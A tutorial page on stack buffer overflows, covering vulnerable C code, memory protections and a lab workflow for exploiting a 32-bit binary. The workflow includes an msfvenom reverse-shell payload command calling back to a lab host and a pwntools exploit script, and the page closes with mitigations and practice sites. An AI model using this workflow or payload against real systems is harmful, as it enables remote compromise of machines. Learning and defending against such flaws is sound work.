# What is a Buffer Overflow?

A Buffer Overflow happens when a program writes more data into a fixed-size buffer than it can hold, spilling into adjacent memory. In unsafe languages like C and C++, that overwrite can clobber the saved return address and redirect execution to attacker-controlled code. It is the foundation of classic memory-corruption exploitation and still shows up in firmware, drivers, and legacy binaries.

## How it works

The classic vulnerable code:

```c
// VULNERABLE - gets() has no bounds check
char buf[64];
gets(buf);           // input longer than 64 bytes overflows into saved RIP
```

The stack (simplified) looks like: `[ buf (64 bytes) ][ saved RBP ][ saved return address ]`. Write past `buf`, keep going, and you overwrite the **return address**. When the function returns, the CPU jumps to whatever you wrote there.

## Memory protections (what you must defeat)

```text
NX / DEP        -> stack not executable (can't run shellcode there) -> use ret2libc/ROP
ASLR            -> addresses randomised -> need a leak or a non-PIE address
Stack Canary    -> random value before RIP, checked on return -> need to leak/avoid it
PIE             -> binary base randomised -> need a leak
RELRO           -> GOT protection
```

Check them: `checksec --file=./vuln`

## Full 32-bit lab exploitation workflow

```bash
# 1. Confirm the crash and find the exact offset to EIP
gdb ./vuln
run $(python3 -c 'print("A"*100)')
info registers            # EIP == 0x41414141 => we control it

# 2. Cyclic pattern to get the precise offset
msf-pattern_create -l 200
# ...feed it, note the EIP value after crash, then:
msf-pattern_offset -l 200 -q 42306142    # prints the offset, e.g. 76

# 3. Verify control: offset bytes then "BBBB"
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"BBBB")'
# EIP should now be 0x42424242

# 4. Identify bad characters (send \x00..\xff, diff in memory)

# 5. Find a JMP ESP gadget to reach your shellcode on the stack
#    (use ropper / mona.py) e.g. 0x625011af

# 6. Generate shellcode avoiding bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b '\x00\x0a' -f python

# 7. Final layout: [padding][JMP ESP addr][NOP sled][shellcode]
```

pwntools version of the exploit:

```python
from pwn import *
p = process('./vuln')
offset = 76
jmp_esp = p32(0x625011af)
nops = b"\x90" * 16
shellcode = b"..."   # from msfvenom
p.sendline(b"A"*offset + jmp_esp + nops + shellcode)
p.interactive()
```

## Beyond the classic (64-bit / modern)

- **ret2libc** - return into `system("/bin/sh")` when NX blocks shellcode
- **ROP** - chain small `gadgets` ending in `ret` to build the exploit
- **Format string** bugs, **GOT overwrite**, **one-gadget** for ASLR bypass with a leak

## Tools

- [GDB](https://www.gnu.org/software/gdb/) + [pwndbg](https://github.com/pwndbg/pwndbg) / [GEF](https://github.com/hugsy/gef)
- [pwntools](https://github.com/Gallopsled/pwntools) - exploit dev framework
- [ropper](https://github.com/sashs/Ropper) / [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) - find gadgets
- [Immunity Debugger + mona.py](https://www.immunityinc.com/products/debugger/) - Windows
- [checksec](https://github.com/slimm609/checksec.sh) - inspect binary protections

## Mitigation - the fix

- Use memory-safe languages (Rust, Go) or safe functions (`fgets`, `strncpy`, `snprintf`) with bounds checks.
- Keep all compiler defenses on: stack canaries (`-fstack-protector-all`), ASLR, DEP/NX, RELRO, PIE.
- Fuzz binaries (AFL++, libFuzzer) and run static analysis in CI.
- Patch and retire legacy unsafe C/C++ components.

## Practice

- [Exploit Education: Phoenix/Protostar](https://exploit.education/)
- pwn.college, ROP Emporium, HTB pwn challenges

## Deep dive

- [Buffer Overflow - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [Exploit Education: Phoenix/Protostar](https://exploit.education/)

## CWE

- CWE-120: Buffer Copy without Checking Size of Input
- CWE-787: Out-of-bounds Write
